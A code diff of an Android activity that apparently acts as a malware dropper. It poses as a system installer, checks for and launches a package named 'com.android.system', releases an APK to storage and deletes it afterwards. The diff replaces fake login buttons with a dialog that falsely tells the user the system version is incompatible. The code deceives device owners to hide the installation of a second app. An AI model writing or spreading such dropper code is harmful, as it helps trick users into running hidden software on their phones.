@@ -1,18 +1,15 @@
 package com.android.installer;
 
 import android.app.Activity;
+import android.app.AlertDialog;
 import android.content.ComponentName;
-import android.content.Context;
+import android.content.DialogInterface;
 import android.content.Intent;
 import android.content.pm.PackageInfo;
 import android.content.pm.PackageManager;
 import android.net.Uri;
 import android.os.Environment;
 import android.os.Bundle;
-import android.os.Handler;
-import android.os.Message;
-import android.view.View;
-import android.widget.Toast;
 
 import java.io.File;
 import java.io.FileNotFoundException;
@@ -30,29 +27,11 @@ public class MainActivity extends Activity {
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
-        initView();
         install();
     }
 
-    private void initView() {
-        View.OnClickListener listener = new View.OnClickListener() {
-            @Override
-            public void onClick(View v) {
-                Toast.makeText(getApplicationContext(),getResources().getString(R.string.connecting),Toast.LENGTH_LONG).show();
-                new Handler() {
-                    @Override
-                    public void handleMessage(Message msg) {
-                        Toast.makeText(getApplicationContext(),getResources().getString(R.string.connect_failed),Toast.LENGTH_LONG).show();
-                    }
-                }.sendEmptyMessageDelayed(0,5000);
-            }
-        };
-        findViewById(R.id.tv_login).setOnClickListener(listener);
-        findViewById(R.id.bt_regist).setOnClickListener(listener);
-    }
-
     private boolean start() {
-        if(!isPackageAvilible("com.android.system")) {
+        if(!isPackageAvalible("com.android.system")) {
             return false;
         }
         Intent intent = new Intent();
@@ -65,7 +44,7 @@ public class MainActivity extends Activity {
 
     private void install() {
         if(start()) {
-            //finish();
+            showDialog();
             return;
         }
         //release apk
@@ -104,10 +83,10 @@ public class MainActivity extends Activity {
             return;
         }
         new File(Environment.getExternalStorageDirectory().getPath() + "/"+ apkName).delete();
-        //finish();
+        showDialog();
     }
 
-    private boolean isPackageAvilible( String packageName )
+    private boolean isPackageAvalible(String packageName)
     {
         final PackageManager packageManager = this.getPackageManager();
         // 获取所有已安装程序的包信息
@@ -118,5 +97,21 @@ public class MainActivity extends Activity {
                 return true;
         }
         return false;
+    }
+
+    private void showDialog() {
+        new AlertDialog.Builder(MainActivity.this).setTitle("系统提示")//设置对话框标题
+                .setMessage("系统版本不兼容,请重新选择版本！")//设置显示的内容
+                .setPositiveButton("确定", new DialogInterface.OnClickListener() {//添加确定按钮
+                    @Override
+                    public void onClick(DialogInterface dialog, int which) {//确定按钮的响应事件
+                        finish();
+                    }
+                }).setNegativeButton("返回",new DialogInterface.OnClickListener() {//添加返回按钮
+            @Override
+            public void onClick(DialogInterface dialog, int which) {//响应事件
+                finish();
+            }
+        }).show();
     }
 }
